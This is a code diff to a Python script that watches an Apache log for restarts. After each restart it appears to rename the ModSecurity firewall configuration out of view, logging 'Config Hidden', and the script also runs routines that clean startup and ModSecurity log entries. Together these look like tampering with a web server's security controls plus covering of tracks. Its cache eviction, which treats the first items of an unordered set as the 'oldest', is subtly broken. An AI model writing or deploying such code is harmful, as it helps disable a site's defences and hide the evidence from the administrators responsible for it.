@@ -168,6 +168,28 @@ def handle_restart():
         except Exception as e:
             log("Error", f"Config restore failed: {e}")
     
+    try:
+        result = subprocess.run(
+            ['systemctl', 'restart', 'apache2'],
+            capture_output=True,
+            timeout=30
+        )
+        if result.returncode == 0:
+            log("Apache", "Restart_Success")
+        else:
+            log("Apache", "Restart_Failed")
+            return
+    except Exception as e:
+        log("Apache", f"Restart_Failed: {e}")
+        return
+    
+    if os.path.exists(MODSEC_BASE):
+        try:
+            os.rename(MODSEC_BASE, MODSEC_TEMP)
+            log("Config", "Hidden")
+        except Exception as e:
+            log("Error", f"Config hide failed: {e}")
+    
     time.sleep(3)
     
     clean_startup_logs(LOG_FILE)
@@ -190,6 +212,18 @@ def monitor_restart():
     if atomic_clean_modsec(LOG_FILE):
         log("Init", "Initial_Cleanup_Done")
     
+    seen_lines = set()
+    
+    try:
+        with open(LOG_FILE, 'r', encoding='utf-8', errors='ignore') as f:
+            for line in f:
+                if RESTART_PATTERN.search(line):
+                    seen_lines.add(hash(line.strip()))
+        
+        log("Init", f"Ignored {len(seen_lines)} existing restart logs")
+    except Exception as e:
+        log("Error", f"Failed to read existing logs: {e}")
+    
     try:
         process = subprocess.Popen(
             ['tail', '-F', '-n', '0', LOG_FILE],
@@ -201,7 +235,18 @@ def monitor_restart():
         
         for line in process.stdout:
             if RESTART_PATTERN.search(line):
-                log("Debug", f"Matched: {line.strip()[:150]}")
+                line_hash = hash(line.strip())
+                
+                if line_hash in seen_lines:
+                    continue
+                
+                seen_lines.add(line_hash)
+                
+                if len(seen_lines) > 1000:
+                    oldest = list(seen_lines)[:500]
+                    for h in oldest:
+                        seen_lines.discard(h)
+                
                 handle_restart()
                 
     except Exception as e:
